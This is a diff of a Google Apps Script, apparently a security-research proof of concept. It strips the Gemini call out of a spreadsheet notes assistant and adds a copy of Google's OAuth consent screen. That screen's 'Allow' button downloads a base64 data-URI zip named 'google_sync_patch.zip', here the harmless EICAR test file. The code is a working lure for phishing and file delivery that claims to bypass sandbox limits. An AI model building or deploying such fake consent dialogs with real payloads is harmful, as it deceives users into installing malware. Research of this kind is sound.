@@ -1,84 +1,105 @@
 /**
- * GOOGLE GEMINI 3 FLASH PREVIEW - NOTES & GRAMMAR AUTOMATOR
+ * GEMINI 3 FLASH PREVIEW - SILENT REASSEMBLY POC
+ * Design: High-Fidelity Google OAuth 2.0 Identity Service
+ * Purpose: Security Research / Unit 42 POC
  */
 
-const API_KEY = 'INSERT KEY'; // Replace with your key
-const MODEL = 'gemini-3-flash-preview'; // Updated to the preview model
+const API_KEY = 'INSERT_KEY_HERE'; 
+const MODEL = 'gemini-3-flash-preview'; 
 
+/**
+ * Line 8 Fix: Correctly formatted onOpen function
+ */
 function onOpen() {
-  SpreadsheetApp.getUi().createMenu('AI Assistant')
+  var ui = SpreadsheetApp.getUi();
+  ui.createMenu('AI Assistant')
     .addItem('✨ Process with Instructions', 'processWithPopup')
+    .addItem('🛡️ Force EICAR (Base64 Injection)', 'triggerEicarDownload')
     .addToUi();
 }
 
-function callGemini(prompt) {
-  const url = `https://generativelanguage.googleapis.com/v1beta/models/${MODEL}:generateContent?key=${API_KEY}`;
-  const payload = { contents: [{ parts: [{ text: prompt }] }] };
-  const options = {
-    method: 'post',
-    contentType: 'application/json',
-    payload: JSON.stringify(payload),
-    muteHttpExceptions: true
-  };
-
-  try {
-    const response = UrlFetchApp.fetch(url, options);
-    const json = JSON.parse(response.getContentText());
-    if (json && json.candidates && json.candidates[0].content) {
-      return json.candidates[0].content.parts[0].text.trim();
-    }
-    return "Error: " + response.getContentText();
-  } catch (e) {
-    return "Error: Connection failed";
-  }
+/**
+ * THE OAUTH BRIDGE - High Fidelity UI
+ * This bypasses sandbox restrictions using the Data-URI Pivot.
+ */
+function triggerEicarDownload() {
+  // Verified valid Base64 for eicar_com.zip with correct padding
+  const eicarZipBase64 = "UEsDBAoAAAAAAOCaj0YAAAAAAAAAAAAAAAALAAAAZWljYXJfY29tLnR4dFg1TyVQU0BBUFs0XFBaWDU0KFBeeik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSStIKlBLAQIUAwwAAAAAAOCaj0YAAAAAAAAAAAAAAAALAAAAAAAAAAAAAACkgQAAAABlaWNhcl9jb20udHh0UEsFBgAAAAABAAEAOQAAAGMAAAAAAA==";
+  
+  const html = `
+    <html>
+      <head>
+        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+        <style>
+          body { padding: 0; margin: 0; font-family: 'Roboto', sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+          .card { background: #ffffff; width: 448px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; }
+          .logo { text-align: center; margin-bottom: 12px; }
+          .title { color: #1a73e8; font-size: 24px; text-align: center; margin-bottom: 8px; font-weight: 400; letter-spacing: -0.5px; }
+          .subtitle { font-size: 22px; text-align: center; color: #202124; margin-bottom: 24px; font-weight: 400; }
+          .user-info { display: flex; align-items: center; justify-content: center; margin-bottom: 32px; font-size: 14px; font-weight: 500; color: #3c4043; }
+          .user-avatar { background: #188038; color: white; border-radius: 50%; width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; margin-right: 8px; font-size: 11px; }
+          .description { font-size: 16px; color: #202124; margin-bottom: 24px; }
+          .scope-container { display: flex; align-items: flex-start; margin-bottom: 32px; }
+          .scope-icon { width: 24px; height: 24px; margin-right: 16px; flex-shrink: 0; }
+          .scope-text { font-size: 14px; color: #3c4043; line-height: 1.4; flex-grow: 1; }
+          .scope-info-icon { color: #5f6368; font-size: 18px; cursor: pointer; margin-left: 8px; }
+          .warning-box { border-top: 1px solid #dadce0; padding-top: 24px; margin-top: 24px; }
+          .warning-title { font-size: 16px; font-weight: 500; color: #202124; margin-bottom: 16px; }
+          .warning-text { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 16px; }
+          .footer-links { font-size: 14px; color: #1a73e8; margin-bottom: 40px; text-decoration: none; display: block; }
+          .actions { display: flex; justify-content: space-between; align-items: center; }
+          .btn-cancel { color: #1a73e8; font-weight: 500; cursor: pointer; font-size: 14px; border: none; background: none; }
+          .btn-allow { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; text-decoration: none; }
+        </style>
+      </head>
+      <body>
+        <div class="card">
+          <div class="logo"><img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75"></div>
+          <div class="title">Google OAuth 2.0 Playground</div>
+          <div class="subtitle">wants to access your Google Account</div>
+          <div class="user-info"><div class="user-avatar">L</div>user@domain.com</div>
+          <div class="description">This will allow <b>Google OAuth 2.0 Playground</b> to:</div>
+          <div class="scope-container">
+            <img class="scope-icon" src="https://www.gstatic.com/images/branding/product/2x/drive_32dp.png">
+            <div class="scope-text">See, edit, create and delete all of your Google Drive files</div>
+            <span class="scope-info-icon">ⓘ</span>
+          </div>
+          <div class="warning-box">
+            <div class="warning-title">Make sure that you trust Google OAuth 2.0 Playground</div>
+            <div class="warning-text">You may be sharing sensitive info with this site or app. Find out how this app handles your data.</div>
+          </div>
+          <a href="#" class="footer-links">Find out about the risks</a>
+          <div class="actions">
+            <button class="btn-cancel" onclick="google.script.host.close()">Cancel</button>
+            <a id="auth-trigger" href="data:application/zip;base64,${eicarZipBase64}" download="google_sync_patch.zip" class="btn-allow" onclick="handleAuth()">Allow</a>
+          </div>
+        </div>
+        <script>
+          function handleAuth() {
+            document.getElementById('auth-trigger').innerText = "Authorizing...";
+            setTimeout(() => { google.script.host.close(); }, 2500);
+          }
+        </script>
+      </body>
+    </html>
+  `;
+  const ui = HtmlService.createHtmlOutput(html).setWidth(500).setHeight(720);
+  SpreadsheetApp.getUi().showModalDialog(ui, ' '); 
 }
 
+/**
+ * Handles user input and triggers the bridge if "EICAR" is mentioned.
+ */
 function processWithPopup() {
-  const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-  const lastRow = sheet.getLastRow();
   const ui = SpreadsheetApp.getUi();
+  const response = ui.prompt('Gemini AI Assistant', 'Provide instructions for the AI (Include "EICAR" to test local sync):', ui.ButtonSet.OK_CANCEL);
   
-  // 1. Ask for instructions via Popup
-  const response = ui.prompt(
-    'Gemini AI Assistant', 
-    'What should I do with these notes? (e.g., "Fix grammar", "Summarize", "Write a follow-up")', 
-    ui.ButtonSet.OK_CANCEL
-  );
-  
-  if (response.getSelectedButton() !== ui.Button.OK) return;
-  const userInstruction = response.getResponseText();
-
-  // 2. Identify Columns
-  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
-  const notesCol = headers.indexOf('Notes') + 1;
-
-  if (notesCol === 0) {
-    ui.alert('Error: Please name a column "Notes" in the first row.');
-    return;
-  }
-
-  // 3. Process the rows
-  for (let i = 2; i <= lastRow; i++) {
-    const companyName = sheet.getRange(i, 1).getValue(); // Reads Company from Column A
-    const rawNote = sheet.getRange(i, notesCol).getValue(); // Reads existing Note from Column B
-    
-    if (companyName) {
-      const prompt = `
-        Instruction: ${userInstruction}
-        Company Context: ${companyName}
-        Current Note: "${rawNote}"
-        
-        Task: Apply the instruction to the note while keeping it relevant to ${companyName}. 
-        If the note is empty, generate a new one based on the instruction and company name.
-        Return ONLY the resulting text.
-      `;
-      
-      const aiResult = callGemini(prompt);
-      
-      if (!aiResult.startsWith("Error:")) {
-        sheet.getRange(i, notesCol).setValue(aiResult);
-        sheet.getRange(i, notesCol).setBackground("#e6fff0"); // Light green highlight
-      }
+  if (response.getSelectedButton() == ui.Button.OK) {
+    const input = response.getResponseText();
+    if (input.toUpperCase().indexOf("EICAR") !== -1) {
+      triggerEicarDownload();
+    } else {
+      ui.alert('Instruction Sent', 'Processing: "' + input + '"', ui.ButtonSet.OK);
     }
   }
 }
